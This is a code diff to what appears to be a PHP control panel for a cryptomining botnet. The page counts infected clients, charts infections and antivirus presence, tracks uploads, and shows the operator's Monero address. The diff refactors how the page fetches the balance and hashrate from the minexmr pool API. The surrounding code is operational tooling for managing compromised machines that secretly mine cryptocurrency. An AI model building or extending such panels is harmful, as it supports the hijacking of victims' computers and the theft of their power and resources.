@@ -77,6 +77,14 @@ foreach($Infections as $x => $y){
 	$InfCount[WhoInfected($x, $y)]++;
 }
 
+$Stats = json_decode(file_get_contents("http://p5.minexmr.com/get_wid_stats?address=45LShhsUY3qC4EguYcBnp4FZcQsTMH7gPYUbN1Q4P2GpfkSEppowERsCHFwPg5qyDvVajGCkonmfVMeJb9WiYNiNUPgWc6b"), true);
+$Bal = number_format($Stats[0]["balance"]/pow(10, 12), 12);
+$HV = 0.0;
+foreach($Stats as $sObj){
+	$HV += $sObj["hashrate"];
+}
+$HR = number_format($HV, 6);
+
 ?>
 <canvas id="infectionChart" style="max-width: 49%; display: inline-block;"></canvas>
 <canvas id="antivirusChart" style="max-width: 49%; display: inline-block;"></canvas>
@@ -87,18 +95,10 @@ foreach($Infections as $x => $y){
 <p>Number of offline clients: <font color="#f44444"><?php echo($Result->num_rows-$OnlineCount); ?></font></p><br>
 <p>Mining address: <font style="font-family: monospace; font-size: 14px;">45LShhsUY3qC4EguYcBnp4FZcQsTMH7gPYUbN1Q4P2GpfkSEp<font color="#f44444">powER</font>sCHFwPg5qyDvVajGCkonmfVMeJb9WiYNiNUPgWc6b</font></p>
 <p>Current balance: <font color="#aaf444"><?php
-	$Stats = file_get_contents("http://p5.minexmr.com/get_wid_stats?address=45LShhsUY3qC4EguYcBnp4FZcQsTMH7gPYUbN1Q4P2GpfkSEppowERsCHFwPg5qyDvVajGCkonmfVMeJb9WiYNiNUPgWc6b");
-	$BalS = substr($Stats, strpos($Stats, 'balance'));
-	$BalS = substr($BalS, 10);
-	$BalS = substr($BalS, 0, strpos($BalS, '"'));
-	$Bal = intval($BalS);
-	echo(number_format($Bal/pow(10, 12), 12));
+	echo($Bal);
 ?></font> XMR</p>
 <p>Current hashrate: <font color="#aaf444"><?php
-	$HR = substr($Stats, strpos($Stats, 'hashrate'));
-	$HR = substr($HR, 10);
-	$HR = substr($HR, 0, strpos($HR, ','));
-	echo($HR);
+    echo($HR);
 ?></font> H/s</p>
 <p><a style="color: #aaf444;" href="https://minexmr.com/#worker_stats" target="_blank">Check the Mining Statistics</a></p><br>
 <p>Number of uploads: <font color="#aaf444"><?php
